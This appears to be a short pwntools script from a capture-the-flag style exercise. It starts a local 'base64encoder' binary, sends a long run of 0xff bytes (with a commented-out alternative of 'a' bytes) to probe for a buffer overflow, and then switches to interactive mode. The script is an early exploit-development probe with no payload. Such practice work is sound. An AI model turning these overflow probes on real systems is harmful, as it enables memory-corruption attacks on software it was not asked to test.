from pwn import *

r = process('./base64encoder')

input()
r.sendline(b'\xff'*0x49)
# r.sendlineafter(b'Text: ',b'a'*0x58)

r.interactive()